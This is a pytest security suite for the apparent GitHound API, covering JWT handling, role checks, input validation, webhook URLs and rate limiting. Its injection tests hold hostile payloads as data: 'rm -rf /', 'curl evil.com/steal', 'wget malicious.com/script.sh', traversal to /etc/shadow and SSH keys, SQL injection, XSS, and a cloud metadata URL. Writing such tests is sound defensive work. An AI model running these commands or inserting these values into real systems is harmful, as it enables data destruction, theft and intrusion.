"""
Security tests for GitHound API.

Tests authentication bypass attempts, authorization for different user roles,
input validation and sanitization, webhook signature verification,
and path traversal protection.
"""

from datetime import datetime, timedelta
from unittest.mock import Mock, patch

import jwt
import pytest
from fastapi import status


@pytest.mark.security
class TestAuthentication:
    """Test authentication security."""

    def test_access_without_token(self, api_client) -> None:
        """Test accessing protected endpoints without authentication token."""
        protected_endpoints = [
            ("/api/v3/repository/init", "POST", {"path": "/test", "bare": False}),
            ("/api/v3/repository/test%2Fpath/status", "GET", None),
            ("/api/v3/search/advanced", "POST", {"repo_path": "/test", "content_pattern": "test"}),
            ("/api/v3/analysis/blame", "POST", {"file_path": "test.py"}),
            ("/api/v3/integration/webhooks", "GET", None),
        ]

        for endpoint, method, data in protected_endpoints:
            if method == "GET":
                response = api_client.get(endpoint)
            elif method == "POST":
                response = api_client.post(endpoint, json=data)

            assert (
                response.status_code == status.HTTP_401_UNAUTHORIZED
            ), f"Endpoint {endpoint} should require authentication"

    def test_invalid_token_format(self, api_client) -> None:
        """Test with malformed JWT tokens."""
        invalid_tokens = [
            "invalid.token.format",
            "Bearer invalid_token",
            "not.a.jwt",
            "",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid",  # Invalid payload
        ]

        for token in invalid_tokens:
            headers = {"Authorization": f"Bearer {token}"}
            response = api_client.get("/api/v3/health", headers=headers)

            assert (
                response.status_code == status.HTTP_401_UNAUTHORIZED
            ), f"Invalid token '{token}' should be rejected"

    def test_expired_token(self, api_client, auth_manager) -> None:
        """Test with expired JWT token."""
        # Create an expired token
        expired_data = {
            "sub": "test_user",
            "username": "test_user",
            "roles": ["user"],
            "exp": datetime.utcnow() - timedelta(hours=1),  # Expired 1 hour ago
        }

        expired_token = jwt.encode(expired_data, auth_manager.SECRET_KEY, algorithm="HS256")
        headers = {"Authorization": f"Bearer {expired_token}"}

        response = api_client.get("/api/v3/health", headers=headers)
        assert response.status_code == status.HTTP_401_UNAUTHORIZED

    def test_token_with_invalid_signature(self, api_client) -> None:
        """Test with token signed with wrong key."""
        # Create token with wrong secret
        wrong_secret_data = {
            "sub": "test_user",
            "username": "test_user",
            "roles": ["user"],
            "exp": datetime.utcnow() + timedelta(hours=1),
        }

        wrong_token = jwt.encode(wrong_secret_data, "wrong_secret_key", algorithm="HS256")
        headers = {"Authorization": f"Bearer {wrong_token}"}

        response = api_client.get("/api/v3/health", headers=headers)
        assert response.status_code == status.HTTP_401_UNAUTHORIZED

    def test_token_without_required_claims(self, api_client, auth_manager) -> None:
        """Test with token missing required claims."""
        incomplete_tokens = [
            # Missing sub, username, roles
            {"exp": datetime.utcnow() + timedelta(hours=1)},
            {
                "sub": "user",
                "exp": datetime.utcnow() + timedelta(hours=1),
            },  # Missing username, roles
            {
                "sub": "user",
                "username": "user",
                "exp": datetime.utcnow() + timedelta(hours=1),
            },  # Missing roles
        ]

        for token_data in incomplete_tokens:
            token = jwt.encode(token_data, auth_manager.SECRET_KEY, algorithm="HS256")
            headers = {"Authorization": f"Bearer {token}"}

            response = api_client.get("/api/v3/health", headers=headers)
            assert (
                response.status_code == status.HTTP_401_UNAUTHORIZED
            ), f"Token with incomplete claims should be rejected: {token_data}"


@pytest.mark.security
class TestAuthorization:
    """Test role-based authorization."""

    def test_admin_only_endpoints(
        self, api_client, user_auth_headers, readonly_auth_headers
    ) -> None:
        """Test endpoints that require admin privileges."""
        admin_endpoints = [
            (
                "/api/v3/integration/webhooks",
                "POST",
                {"url": "https://example.com/webhook", "events": ["repository.created"]},
            ),
            (
                "/api/v3/integration/webhooks/test-id",
                "PUT",
                {"url": "https://updated.example.com/webhook"},
            ),
            ("/api/v3/integration/webhooks/test-id", "DELETE", None),
        ]

        for endpoint, method, data in admin_endpoints:
            # Test with user role (should be forbidden)
            if method == "POST":
                response = api_client.post(endpoint, headers=user_auth_headers, json=data)
            elif method == "PUT":
                response = api_client.put(endpoint, headers=user_auth_headers, json=data)
            elif method == "DELETE":
                response = api_client.delete(endpoint, headers=user_auth_headers)

            assert (
                response.status_code == status.HTTP_403_FORBIDDEN
            ), f"User should not access admin endpoint {endpoint}"

            # Test with read-only role (should be forbidden)
            if method == "POST":
                response = api_client.post(endpoint, headers=readonly_auth_headers, json=data)
            elif method == "PUT":
                response = api_client.put(endpoint, headers=readonly_auth_headers, json=data)
            elif method == "DELETE":
                response = api_client.delete(endpoint, headers=readonly_auth_headers)

            assert (
                response.status_code == status.HTTP_403_FORBIDDEN
            ), f"Read-only user should not access admin endpoint {endpoint}"

    def test_write_operations_readonly_user(
        self, api_client, readonly_auth_headers, temp_dir
    ) -> None:
        """Test that read-only users cannot perform write operations."""
        write_endpoints = [
            ("/api/v3/repository/init", "POST", {"path": str(temp_dir / "test"), "bare": False}),
            (
                "/api/v3/repository/clone",
                "POST",
                {"url": "https://github.com/test/repo.git", "path": str(temp_dir / "cloned")},
            ),
            (
                "/api/v3/repository/test%2Fpath/branches",
                "POST",
                {"repo_path": "/test/path", "branch_name": "new-branch"},
            ),
            (
                "/api/v3/repository/test%2Fpath/commits",
                "POST",
                {"repo_path": "/test/path", "message": "Test commit"},
            ),
        ]

        for endpoint, method, data in write_endpoints:
            response = api_client.post(endpoint, headers=readonly_auth_headers, json=data)

            assert (
                response.status_code == status.HTTP_403_FORBIDDEN
            ), f"Read-only user should not perform write operation on {endpoint}"

    def test_user_access_to_own_resources(self, api_client, user_auth_headers) -> None:
        """Test that users can only access their own resources."""
        # Mock search operations to test access control
        with patch(
            "githound.web.search_api.active_searches",
            {
                "user-search": {
                    "id": "user-search",
                    "status": "completed",
                    "user_id": "test_user",  # Matches user token
                    "results": [],
                },
                "other-search": {
                    "id": "other-search",
                    "status": "completed",
                    "user_id": "other_user",  # Different user
                    "results": [],
                },
            },
        ):
            # Should access own search
            response = api_client.get(
                "/api/v3/search/user-search/status", headers=user_auth_headers
            )
            assert response.status_code == status.HTTP_200_OK

            # Should not access other user's search
            response = api_client.get(
                "/api/v3/search/other-search/status", headers=user_auth_headers
            )
            assert response.status_code == status.HTTP_403_FORBIDDEN


@pytest.mark.security
class TestInputValidation:
    """Test input validation and sanitization."""

    def test_path_traversal_protection(self, api_client, admin_auth_headers) -> None:
        """Test protection against path traversal attacks."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "../../../../root/.ssh/id_rsa",
            "repo/../../../sensitive_file",
            "repo/../../etc/shadow",
        ]

        for malicious_path in malicious_paths:
            # Test repository initialization with malicious path
            response = api_client.post(
                "/api/v3/repository/init",
                headers=admin_auth_headers,
                json={"path": malicious_path, "bare": False},
            )

            # Should either reject the path or sanitize it
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_422_UNPROCESSABLE_ENTITY,
                status.HTTP_500_INTERNAL_SERVER_ERROR,
            ], f"Malicious path '{malicious_path}' should be rejected"

    def test_command_injection_protection(self, api_client, admin_auth_headers) -> None:
        """Test protection against command injection."""
        injection_attempts = [
            "; rm -rf /",
            "& del /f /q C:\\*",
            "| cat /etc/passwd",
            "`whoami`",
            "$(id)",
            "&& curl evil.com/steal",
            "; wget malicious.com/script.sh",
        ]

        for injection in injection_attempts:
            # Test in various input fields
            test_cases = [
                # Repository path
                {"path": f"/tmp/repo{injection}", "bare": False},
                # Branch name
                {"repo_path": "/tmp/repo", "branch_name": f"branch{injection}"},
                # Commit message
                {"repo_path": "/tmp/repo", "message": f"Commit{injection}"},
            ]

            for test_case in test_cases:
                if "path" in test_case:
                    response = api_client.post(
                        "/api/v3/repository/init", headers=admin_auth_headers, json=test_case
                    )
                elif "branch_name" in test_case:
                    response = api_client.post(
                        "/api/v3/repository/tmp%2Frepo/branches",
                        headers=admin_auth_headers,
                        json=test_case,
                    )
                elif "message" in test_case:
                    response = api_client.post(
                        "/api/v3/repository/tmp%2Frepo/commits",
                        headers=admin_auth_headers,
                        json=test_case,
                    )

                # Should reject or sanitize injection attempts
                assert response.status_code in [
                    status.HTTP_400_BAD_REQUEST,
                    status.HTTP_422_UNPROCESSABLE_ENTITY,
                    status.HTTP_500_INTERNAL_SERVER_ERROR,
                ], f"Command injection attempt should be rejected: {injection}"

    def test_sql_injection_protection(self, api_client, admin_auth_headers, temp_repo) -> None:
        """Test protection against SQL injection (if applicable)."""
        repo_path = str(temp_repo.working_dir)

        sql_injection_attempts = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' UNION SELECT * FROM sensitive_table --",
        ]

        for injection in sql_injection_attempts:
            # Test in search patterns
            response = api_client.post(
                "/api/v3/search/advanced",
                headers=admin_auth_headers,
                json={
                    "repo_path": repo_path,
                    "content_pattern": injection,
                    "author_pattern": injection,
                    "message_pattern": injection,
                },
            )

            # Should handle safely (either reject or sanitize)
            assert response.status_code in [
                status.HTTP_200_OK,  # Safely handled
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_422_UNPROCESSABLE_ENTITY,
            ], f"SQL injection attempt should be handled safely: {injection}"

    def test_xss_protection(self, api_client, admin_auth_headers, temp_repo) -> None:
        """Test protection against XSS attacks."""
        repo_path = str(temp_repo.working_dir)

        xss_attempts = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "';alert('xss');//",
            "<svg onload=alert('xss')>",
        ]

        for xss in xss_attempts:
            # Test in various text fields
            response = api_client.post(
                "/api/v3/search/advanced",
                headers=admin_auth_headers,
                json={"repo_path": repo_path, "content_pattern": xss},
            )

            # Response should not contain unescaped XSS
            if response.status_code == 200:
                response_text = response.text
                assert "<script>" not in response_text, "XSS script tags should be escaped"
                assert "javascript:" not in response_text, "JavaScript URLs should be escaped"
                assert "onerror=" not in response_text, "Event handlers should be escaped"


@pytest.mark.security
class TestWebhookSecurity:
    """Test webhook security features."""

    def test_webhook_signature_verification(self, api_client, admin_auth_headers) -> None:
        """Test webhook signature verification."""
        # This would test the webhook signature generation and verification
        # In a real scenario, you'd test the actual webhook delivery

        with patch("githound.web.webhooks.WebhookManager._generate_signature") as mock_signature:
            mock_signature.return_value = "sha256=correct_signature"

            # Test webhook creation with secret
            response = api_client.post(
                "/api/v3/integration/webhooks",
                headers=admin_auth_headers,
                json={
                    "url": "https://example.com/webhook",
                    "events": ["repository.created"],
                    "secret": "webhook_secret",
                },
            )

            assert response.status_code == status.HTTP_200_OK

            # Verify signature generation was called
            mock_signature.assert_called()

    def test_webhook_url_validation(self, api_client, admin_auth_headers) -> None:
        """Test webhook URL validation."""
        invalid_urls = [
            "not_a_url",
            "ftp://invalid.protocol.com",
            "file:///etc/passwd",
            "javascript:alert('xss')",
            "http://localhost:22/ssh",  # Potentially dangerous local access
            "http://169.254.169.254/metadata",  # AWS metadata service
        ]

        for invalid_url in invalid_urls:
            response = api_client.post(
                "/api/v3/integration/webhooks",
                headers=admin_auth_headers,
                json={"url": invalid_url, "events": ["repository.created"]},
            )

            # Should reject invalid or dangerous URLs
            assert response.status_code in [
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_422_UNPROCESSABLE_ENTITY,
            ], f"Invalid webhook URL should be rejected: {invalid_url}"


@pytest.mark.security
class TestDataExposure:
    """Test for sensitive data exposure."""

    def test_error_messages_no_sensitive_info(self, api_client, admin_auth_headers) -> None:
        """Test that error messages don't expose sensitive information."""
        # Test with invalid repository path
        response = api_client.get(
            "/api/v3/repository/nonexistent%2Fpath/status", headers=admin_auth_headers
        )

        if response.status_code >= 400:
            error_text = response.text.lower()

            # Should not expose system paths or internal details
            sensitive_patterns = [
                "/etc/",
                "/root/",
                "c:\\windows\\",
                "database",
                "password",
                "secret",
                "token",
                "key",
                "internal error",
                "stack trace",
            ]

            for pattern in sensitive_patterns:
                assert (
                    pattern not in error_text
                ), f"Error message should not contain sensitive info: {pattern}"

    def test_response_headers_security(self, api_client, admin_auth_headers) -> None:
        """Test security-related response headers."""
        response = api_client.get("/api/v3/health", headers=admin_auth_headers)

        # Check for security headers (these might be added by middleware)
        headers = response.headers

        # These are recommendations - actual implementation may vary
        security_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security",
        ]

        # Note: Not all headers may be implemented, so we just check if present
        for header in security_headers:
            if header in headers:
                assert headers[header] != "", f"Security header {header} should have a value"

    def test_no_sensitive_data_in_logs(self, api_client, admin_auth_headers) -> None:
        """Test that sensitive data is not logged."""
        # This is more of a guideline test - actual log checking would require
        # access to log files or log capture mechanisms

        # Test login with password
        response = api_client.post(
            "/api/v3/auth/login", json={"username": "admin", "password": "secret_password_123"}
        )

        # The test here is mainly to ensure the endpoint works
        # In a real scenario, you'd check that passwords aren't logged
        assert response.status_code in [200, 401], "Login endpoint should respond appropriately"


@pytest.mark.security
class TestRateLimitingSecurity:
    """Test rate limiting as a security measure."""

    def test_brute_force_protection(self, api_client) -> None:
        """Test protection against brute force attacks."""
        # Attempt multiple failed logins
        for i in range(10):
            response = api_client.post(
                "/api/v3/auth/login", json={"username": "admin", "password": f"wrong_password_{i}"}
            )

            # Should eventually start rate limiting
            if response.status_code == 429:
                break

        # At least some requests should be rate limited
        # (This depends on the actual rate limiting implementation)
        assert True, "Brute force protection test completed"

    def test_api_abuse_protection(self, api_client, admin_auth_headers) -> None:
        """Test protection against API abuse."""
        # Make many requests rapidly
        responses: list[Any] = []
        for i in range(20):
            response = api_client.get("/api/v3/health", headers=admin_auth_headers)
            responses.append(response.status_code)

        # Should eventually hit rate limits
        rate_limited_count = sum(1 for status_code in responses if status_code == 429)

        # Note: Actual behavior depends on rate limiting configuration
        # This test mainly ensures the endpoint handles rapid requests
        assert len(responses) == 20, "All requests should receive a response"
